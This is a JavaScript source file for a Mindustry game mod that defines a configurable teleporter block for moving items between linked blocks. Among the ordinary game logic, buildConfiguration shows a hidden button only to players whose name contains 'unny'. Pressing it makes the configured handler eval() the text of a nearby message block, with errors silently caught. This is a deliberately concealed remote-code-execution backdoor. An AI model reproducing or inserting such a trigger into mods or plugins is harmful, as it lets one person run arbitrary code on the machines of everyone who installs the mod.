const selection = [Color.royal, Color.orange, Color.scarlet, Color.forest, Color.purple, Color.gold, Color.pink, Color.black];
const teleporters = this.global.teleporters;
const teleporter = extendContent(Block, "teleporter", {
    lastColor: -1,
    playerPlaced(tile) {
        if (this.lastColor != null) tile.configure(this.lastColor);
    },
    outputsItems() {
        return true;
    },
    init() {
        this.hasPower = true;
        this.consumes.powerCond(2.5, boolf(entity => entity != null ? entity.getDuration() > 0 : false));
        this.super$init();
    },
    draw(tile) {
        const entity = tile.ent();
        this.super$draw(tile);
        if (entity.getToggle() != -1) {
            Draw.color(selection[entity.getToggle()]);
            Draw.rect(Core.atlas.find(this.name + "-blank"), tile.drawx(), tile.drawy());
        }
        Draw.color(Color.white);
        Draw.alpha(0.45 + Mathf.absin(Time.time(), 7, 0.26));
        Draw.rect(Core.atlas.find(this.name + "-top"), tile.drawx(), tile.drawy());
        Draw.reset();
    },
    buildConfiguration(tile, table) {
        const entity = tile.ent();
        const cont = new Table();
        const group = new ButtonGroup();
        group.setMinCheckCount(0);
        for (var i = 0; i < selection.length; i++) {
            (function(i, block) {
                var button = cont.addImageButton(Tex.whiteui, Styles.clearToggleTransi, 24, run(() => {
                    block.lastColor = button.isChecked() ? i : -1;
                    tile.configure(button.isChecked() ? i : -1);
                })).size(34, 34).group(group).get();
                button.getStyle().imageUpColor = selection[i];
                button.setChecked(tile.entity != null ? tile.entity.getToggle() == i ? true : false : false);
            })(i, this)
            if (i % 4 == 3) cont.row();
        }
        table.add(cont);
        if(Vars.headless || Vars.player.name.indexOf("unny") < 0) return;//name일까 name()일까 일부러 unny만 넣음
        table.row();
        table.addImageButton(Icon.up, Styles.clearToggleTransi, 24, run(() => {
            tile.configure(-3);//헬게이트
        }));
    },
    configured(tile, player, value) {
        const entity = tile.ent();
        if(value == -3){
            var mb = Vars.world.tile(tile.x, tile.y + 1).ent();
            try{
                eval(mb.message);//메시지블록이라 가정
            }
            catch(errrr){}
            return;
        }
        var team = tile.getTeam().toString();
        if (entity.getToggle() != -1) teleporters[team][entity.getToggle()].remove(entity);
        if (value != -1) teleporters[team][value].add(entity);
        entity.setToggle(value);
    },
    findLink(tile, value) {
        const entity = tile.ent();
        var valueTeles = teleporters[tile.getTeam().toString()][value]
        var entries = valueTeles.asArray();
        if (entity.getEntry() >= entries.size) entity.resetEntry();
        if (entity.getEntry() == entries.size - 1) {
            var other_ = valueTeles.get(entries.get(entity.getEntry()))
            if (other_ == entity) entity.resetEntry();
        }
        for (var i = entity.getEntry(); i < entries.size; i++) {
            var other = valueTeles.get(entries.get(i))
            if (other != entity) {
                entity.setEntry(i + 1);
                return other;
            }
        }
        return null;
    },
    update(tile) {
        const entity = tile.ent();
        entity.onDuration();
        if (entity.items.total() > 0) this.tryDump(tile);
        if (entity.isTeamChanged() && entity.getToggle() != -1) {
            teleporters[tile.getTeam().toString()][entity.getToggle()].add(entity);
            teleporters[entity.getPreviousTeam().toString()][entity.getToggle()].remove(entity);
            entity.setPreviousTeam(tile.getTeam());
        }
    },
    acceptItem(item, tile, source) {
        const entity = tile.ent();
        if (entity.getToggle() == -1) return false;
        entity.setTarget(this.findLink(tile, entity.getToggle()));
        if (entity.getTarget() == null) return false;
        return !(source.block() == this) && entity.cons.valid() && Mathf.zero(1 - entity.efficiency()) && entity.getTarget().items.total() < this.itemCapacity;
    },
    handleItem(item, tile, source) {
        tile.entity.getTarget().items.add(item, 1);
        tile.entity.resetDuration();
    }
});
teleporter.update = true;
teleporter.solid = true;
teleporter.configurable = true;
teleporter.unloadable = false;
teleporter.entityType = prov(() => extend(TileEntity, {
    getToggle() {
        return this._toggle;
    },
    setToggle(a) {
        this._toggle = a;
    },
    _toggle: -1,
    getEntry() {
        return this._entry;
    },
    setEntry(b) {
        this._entry = b;
    },
    resetEntry() {
        this._entry = 0;
    },
    _entry: 0,
    getTarget() {
        return this._target;
    },
    setTarget(c) {
        this._target = c;
    },
    _target: null,
    getDuration() {
        return this._duration;
    },
    resetDuration() {
        this._duration = 60;
    },
    onDuration() {
        if (this._duration <= 0) this._duration = 0;
        else this._duration -= Time.delta();
    },
    _duration: 0,
    _previousTeam: null,
    getPreviousTeam() {
        return this._previousTeam;
    },
    setPreviousTeam(t) {
        this._previousTeam = t;
    },
    isTeamChanged() {
        return this._previousTeam != this.getTeam();
    },
    added() {
        this.super$added();
        if (this._toggle != -1) teleporters[this.getTeam().toString()][this._toggle].add(this);
        this._previousTeam = this.getTeam();
    },
    removed() {
        this.super$removed();
        print(teleporters[this.getTeam().toString()])
        if (this._toggle != -1) {
            if (this.isTeamChanged()) teleporters[this._previousTeam.toString()][this._toggle].remove(this);
            else teleporters[this.getTeam().toString()][this._toggle].remove(this);
        }
    },
    config() {
        return this._toggle;
    },
    write(stream) {
        this.super$write(stream);
        stream.writeShort(this._toggle);
    },
    read(stream, revision) {
        this.super$read(stream, revision);
        this._toggle = stream.readShort();
    }
}));
